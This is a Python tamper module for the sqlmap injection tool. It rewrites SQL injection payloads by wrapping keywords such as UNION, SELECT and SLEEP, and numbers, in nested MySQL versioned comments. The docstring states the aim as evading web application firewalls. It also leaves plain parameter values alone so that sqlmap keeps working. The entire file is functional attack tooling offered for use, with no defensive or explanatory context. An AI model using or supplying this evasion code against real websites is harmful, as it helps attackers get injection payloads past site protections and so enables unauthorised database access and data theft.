import re

def dependencies():
    pass

# A more explicit list of common SQL keywords, identifiers, and functions
# that should be targeted for wrapping. This avoids wrapping generic words
# that might be part of a URL parameter name.
SQL_TARGET_WORDS = [
    "SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "ORDER", "BY",
    "GROUP", "HAVING", "LIMIT", "OFFSET", "INTO", "OUTFILE", "DUMPFILE",
    "LOAD_FILE", "SLEEP", "BENCHMARK", "VERSION", "DATABASE", "USER",
    "CURRENT_USER", "SCHEMA", "TABLE_NAME", "COLUMN_NAME", "INFORMATION_SCHEMA",
    "ASCII", "SUBSTRING", "LENGTH", "COUNT", "CAST", "CONCAT", "NULL", "TRUE", "FALSE"
]

# Indicators that suggest the payload contains actual SQL injection syntax,
# not just a simple parameter value.
SQL_INDICATORS = [
    "SELECT", "UNION", "AND", "OR", "XOR", "CAST", "SLEEP", "BENCHMARK",
    "--", "/*", "*/", "'", "\"", "(", ")", "+", "-", ",", ";", ">", "<", "="
]

def tamper(payload, **kwargs):
    """
    Wraps specific SQL keywords and numbers in the payload with
    '/**_**//*!50000... */' for MySQL-specific WAF evasion.
    Crucially, it avoids wrapping the initial simple value of a parameter
    (like '29' in 'Id=29') to maintain sqlmap's parameter recognition.
    """
    if not payload:
        return payload

    ret = payload
    is_sql_injection = False

    # Check for SQL indicators first. If none are found, and the payload
    # looks like a simple number or quoted string, we leave it untouched.
    for indicator in SQL_INDICATORS:
        # Use re.search for partial matches (like 'AND' within a larger string)
        # and re.escape for special characters. Case-insensitive.
        if re.search(r"%s" % re.escape(indicator), payload, re.IGNORECASE):
            is_sql_injection = True
            break
            
    if not is_sql_injection:
        # If no SQL indicators are present, check if it's just a simple number or quoted string.
        # This covers cases like payload="29" or payload="'test'".
        if re.fullmatch(r"\d+(?:\.\d*)?", payload) or \
           re.fullmatch(r"'[^']*'", payload) or \
           re.fullmatch(r'"[^"]*"', payload):
            return payload # Return untouched to preserve initial parameter value

    # If SQL injection indicators are found, or it's not a simple parameter value,
    # then proceed with aggressive wrapping.

    # First, wrap specific SQL keywords from our list
    # Sort by length descending to ensure longer keywords are matched first
    for keyword in sorted(SQL_TARGET_WORDS, key=len, reverse=True):
        # Use regex to find whole words, case-insensitive
        # \b ensures it's a full word boundary
        ret = re.sub(r"\b%s\b" % re.escape(keyword), r"/**_**//*!50000\g<0>*/", ret, flags=re.IGNORECASE)

    # Second, wrap all standalone numbers.
    # This pattern captures integers and floating-point numbers.
    # It's applied AFTER keywords to avoid issues if a keyword happens to contain a number.
    ret = re.sub(r"\b(\d+(?:\.\d*)?)\b", r"/**_**//*!50000\1*/", ret)
        
    return ret
